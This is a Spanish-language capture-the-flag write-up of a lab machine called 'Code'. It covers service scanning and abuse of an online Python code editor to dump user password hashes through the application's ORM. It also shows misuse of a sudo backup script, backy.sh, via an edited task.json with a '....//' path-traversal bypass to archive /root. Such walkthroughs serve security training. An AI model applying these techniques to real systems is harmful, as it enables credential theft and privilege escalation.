🔍 Información de la máquina

La máquina Code se centra en una aplicación web basada en Python que incluye un editor de código en línea. Esta configuración introduce desafíos relacionados con entornos de ejecución restringidos (sandboxes) y técnicas para evadir estas restricciones. Además, se exploran conceptos de escalada de privilegios mediante la explotación de configuraciones incorrectas del sistema.

El primer paso fue realizar un escaneo con nmap -sC -sV -T5 para identificar servicios activos y versiones. La máquina respondió en el puerto 22 con un servicio OpenSSH 8.2p1, y en el puerto 5000 con un servidor Gunicorn 20.0.4, que sirve una aplicación web titulada Python Code Editor.

Llamó la atención que varios puertos estaban en estado filtered, lo cual sugiere que podrían estar protegidos por un firewall o filtrados por reglas específicas del host. Esto limitó el reconocimiento, pero el servicio en el puerto 5000 se convirtió en el foco principal para continuar la enumeración y búsqueda de vectores de ataque.

El escaneo reveló varias rutas interesantes podemos encontrar que 2 puertos están escuchando, vamos a revisar 10.10.11.62:5000.:

Al acceder a la aplicación web en el puerto 5000, se presenta un entorno interactivo de ejecución de código Python en tiempo real. El entorno permite escribir código en un editor del lado izquierdo, y al hacer clic en el botón "Run", los resultados se imprimen en el área derecha.

⚠️ Esto representa una superficie de ataque crítica, ya que si el servidor no implementa un entorno seguro y aislado (sandboxing) para ejecutar el código, podría ser vulnerable a Remote Code Execution (RCE).

Mediante la ejecución del siguiente código en el entorno de ejecución vulnerable:

print([(user.id, user.username, user.password) for user in User.query.all()])

Se logró obtener una lista completa de usuarios registrados en la base de datos, incluyendo sus nombres de usuario y hashes de contraseñas:

[(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'),
 (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]
  • Se confirma que el entorno de ejecución tiene acceso directo al modelo de datos y puede interactuar con el ORM (probablemente SQLAlchemy).
  • Las contraseñas no están en texto plano, pero los hashes pueden ser sometidos a ataques de fuerza bruta o cracking con herramientas como John the Ripper o Hashcat.

🌚 Obtencion de la bandera usuario

martin@code:~/backups$ nano task.json 

{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/user.txt"
        ],

        "exclude": [
                ".*"
        ]
}

Cambiemos la task.json para obtener user.txt

Ejecutamos el script /usr/bin/backy.sh usando sudo con el archivo de configuración task.json como argumento.

El script indica que no hay archivos nuevos para sincronizar ("Nothing to sync"), pero procede a crear un archivo de respaldo (backup) de la carpeta /home/app-production/app.

El archivo generado se guarda en /home/martin/backups con un nombre que incluye la fecha y el origen del backup (code_home_app-production_user.txt_2025_May.tar.bz2).

martin@code:~/backups$ tar -xjf ./code_home_app-production_user.txt_2025_May.tar.bz2
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2    home
code_home_app-production_user.txt_2025_May.tar.bz2  task.json
martin@code:~/backups$ cd home
martin@code:~/backups/home$ ls
app-production
martin@code:~/backups/home$ cd app-production
martin@code:~/backups/home/app-production$ ls
user.txt

Ejecutamos el comando tar -xjf para descomprimir el archivo code_home_app-production_user.txt_2025_May.tar.bz2, que contiene un respaldo comprimido. Al listar el directorio después de la extracción, aparece una nueva carpeta llamada home.

Ingresamos a home y luego a la subcarpeta app-production, dentro de esta carpeta, encontramos el archivo user.txt.

👹 Escalada de privilegios

martin@code:~$ nano task.json 
martin@code:~$ cat task.json 
{
        "destination": "/home/martin/",
        "multiprocessing": true,
        "verbose_log": true,
        "directories_to_archive": [
                "/home/....//root/"
        ]
}

Cambiemos la task.json para obtener el root.txt

martin@code:~/backups$ sudo /usr/bin/backy.sh ./task.json
2025/05/20 02:53:46 🍀 backy 1.2
2025/05/20 02:53:46 📋 Working with ./task.json ...
2025/05/20 02:53:46 💤 Nothing to sync
2025/05/20 02:53:46 📤 Archiving: [/home/../root]
2025/05/20 02:53:46 📥 To: /home/martin/backups ...
2025/05/20 02:53:46 📦
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_May.tar.bz2  task.json
martin@code:~/backups$ tar -xjf code_home_.._root_2025_May.tar.bz2
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_May.tar.bz2  root  task.json
martin@code:~/backups$ cd root
martin@code:~/backups/root$ ls
root.txt  scripts

Volvemos a ejecutar el script backy.sh con sudo usando el archivo task.json modificado, que ahora incluye la ruta para archivar /root.

Extraemos el contenido del backup con tar -xjf. Esto crea un nuevo directorio llamado root con el contenido del backup.

Dentro del directorio root, encontramos archivo root.txt, para asi finalizar la maquina.
